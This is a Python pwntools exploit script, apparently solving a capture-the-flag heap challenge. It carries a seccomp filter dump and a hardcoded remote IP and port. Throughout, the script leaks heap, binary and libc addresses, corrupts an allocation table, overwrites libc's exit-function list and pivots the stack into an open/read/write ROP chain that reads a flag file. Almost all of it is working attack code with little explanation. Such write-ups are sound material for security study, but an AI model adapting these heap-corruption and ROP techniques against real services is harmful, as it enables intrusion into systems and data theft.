#!/usr/bin/python
from pwn import *
import sys

LOCAL = True

HOST = "43.155.75.222"
PORT = 23333
PROCESS = "./pwn"

"""
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x07 0xc000003e  if (A != ARCH_X86_64) goto 0009
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x04 0xffffffff  if (A != 0xffffffff) goto 0009
 0005: 0x15 0x03 0x00 0x0000003b  if (A == execve) goto 0009
 0006: 0x15 0x02 0x00 0x0000009d  if (A == prctl) goto 0009
 0007: 0x15 0x01 0x00 0x00000142  if (A == execveat) goto 0009
 0008: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0009: 0x06 0x00 0x00 0x00000000  return KILL
"""

def summon(idx, size, data):
	r.send("1")
	
	r.send(p32(size))
	r.send(p8(idx))
	
	if len(data) == size:
		r.send(data)
	else:
		r.sendline(data)

	r.recvuntil(":")

def set_size(idx, size):
	r.send("1")
	r.send(p32(size))
	r.send(p8(idx))
	r.recvuntil(":")

def set_cursize(idx):
	r.send("2")
	r.send(p8(idx))
	r.recvuntil(":")

def prepare(idx, data, sendline=False):
	r.send("3")
	r.send(p8(idx))
	
	if sendline:
		r.sendline(data)
	else:
		r.send(data)
	return r.recvuntil(":")

def leak(idx):
	r.send("4")
	r.send(p8(idx))
	r.recvuntil("use ")
	LEAK = r.recvuntil(" to attack", drop=True)
	r.recvuntil(":")
	return LEAK

def quit():
	r.send("5")

def test_off(idx, off):
	set_size(idx, off)
	set_cursize(idx)
	set_size(idx, off+8)
	resp = prepare(idx, "", True)
	if "failed" in resp:
		r.recv(1)
		return False

	return True

def exploit(r):
	r.recvuntil(":")

	summon(0, 0x30, "")

	# Find a valid offset to start of heap
	HEAP_OFF = 0x1068

	while True:
		log.info("Test: %s" % hex(HEAP_OFF))
		found = test_off(0, HEAP_OFF)

		if found:
			break
		
		HEAP_OFF += 0x1000

	HEAP_OFF -= 0x8

	log.info("HEAP offset: %s" % hex(HEAP_OFF))

	for i in range(5):
		summon(1, 0x40, "")

	summon(0, 0x40, "")

	set_size(0, 0x1010)

	payload = "A"*(0x2e0-1)
	
	prepare(0, payload)

	LEAK = u64(leak(0).ljust(8, "\x00"))
	HEAP = LEAK - 0xb8

	log.info("HEAP leak       : %s" % hex(LEAK))
	log.info("HEAP base       : %s" % hex(HEAP))

	BSS = HEAP + 0x8 - HEAP_OFF - 0xf90 - 0x18
	ELF = BSS - 0x4000

	log.info("BSS             : %s" % hex(BSS))
	log.info("ELF             : %s" % hex(ELF))	

	# 0x55555555a118 => allocation of next arena
	BUFFER = BSS + 0xcb0
	OFFSET = (HEAP + 0x118) - BUFFER

	# overwrite next free chunk address with pointer to bss	
	set_size(0, OFFSET)
	set_cursize(0)
	set_size(0, OFFSET+8)

	prepare(0, p64(BSS + 0x10))

	# overwrite entries table to prepare libc leak	
	payload = p64(BSS + 0x40-0x30) + p64(0x1000)
	payload += p64(0x0) + p64(ELF + 0x3fb0)		    # 1 -> read got
	payload += p64(0x100) + p64(0)

	# next allocation will overwrite entry table
	summon(0, 0x30, payload)
		
	LIBCLEAK = u64(leak(1).ljust(8, "\x00"))
	LIBC = LIBCLEAK - 0x74f10

	log.info("LIBC leak       : %s" % hex(LIBCLEAK))
	log.info("LIBC            : %s" % hex(LIBC))

	# overwrite entries table
	payload = p64(BSS + 0x100 -0x30) + p64(0x1000)  # 0 -> point to helper buffer
	payload += p64(0x0) + p64(BSS + 0x40)           # 1 -> point to entry table
	payload += p64(0x100) + p64(0)

	# overwrite entry table
	prepare(0, payload)

	# 0x000000000007b1f5: mov rsp, qword ptr [rdi + 0x30]; jmp qword ptr [rdi + 0x38];
	STACKPIVOT = LIBC + 0x7b1f5
	RET = LIBC + 0x47ed7

	# write fake exitfunc table to BSS + 0x100
	prepare(0, p64(STACKPIVOT))       # rip

	# overwrite entry table again
	payload = p64(BSS + 0x200) + p64(0x1000)
	payload += p64(0x0) + p64(BSS + 0x40)
	payload += p64(0x100) + p64(0)

	prepare(1, payload)

	POPRAX = LIBC+ 0x0000000000016a96
	POPRDI = LIBC+ 0x00000000000152a1
	POPRSI = LIBC+ 0x000000000001dad9
	POPRDX = LIBC+ 0x000000000002cdae
	SYSCALL =LIBC + 0x00000000000238f0

	# write exitfunc argument to BSS + 0x200		
	payload = p64(BSS+0x210-0x30)	# rdi
	payload += p64(0x0)
	payload += p64(BSS+0x220)		# rsp
	payload += p64(RET)

	# open("./flag", 0, 0)
	payload += p64(POPRAX)
	payload += p64(2)
	payload += p64(POPRDI)
	payload += p64(BSS+0x200+0x200)
	payload += p64(POPRSI)
	payload += p64(0)
	payload += p64(POPRDX)
	payload += p64(0)
	payload += p64(SYSCALL)

	# read(3, BSS+0x400, 100)
	payload += p64(POPRAX)
	payload += p64(0)
	payload += p64(POPRDI)
	payload += p64(3)
	payload += p64(POPRSI)
	payload += p64(BSS+0x200+0x200)
	payload += p64(POPRDX)
	payload += p64(100)
	payload += p64(SYSCALL)

	# write(1, BSS+0x400, 100)
	payload += p64(POPRAX)
	payload += p64(1)
	payload += p64(POPRDI)
	payload += p64(1)
	payload += p64(POPRSI)
	payload += p64(BSS+0x200+0x200)
	payload += p64(POPRDX)
	payload += p64(100)
	payload += p64(SYSCALL)

	payload = payload.ljust(0x200, "\x00")
	payload += "./flag\x00"

	prepare(0, payload)

	# 0x55555555a050 has target address
	BUFFER = BSS + 0x40
	OFFSET = (LEAK - 0x68) - BUFFER

	set_size(1, OFFSET)
	set_cursize(1)
	set_size(1, OFFSET+8)

	# overwrite next free arena address to point near exitfuncs address
	prepare(1, p64(LIBC + 0xb6d10 - 0x30))

	payload = "A"*0x48
	payload += p64(BSS+0x100-8)		# point to helper buffer
	summon(0, 0x100, payload)
	
	payload = "A"*(0x130-4-8)
	payload += p32(0x1)				# count for exitfuncs (rcx)

	summon(1, 0x130, payload)

	r.send("4")
	r.send(p8(0))

	r.interactive()
	
	return

if __name__ == "__main__":
	if len(sys.argv) > 1:
		LOCAL = False
		r = remote(HOST, PORT)		
	else:
		LOCAL = True
		r = process("./pwn")
		#r = remote("localhost", 23334)
		
		print (util.proc.pidof(r))
		pause()
	
	exploit(r)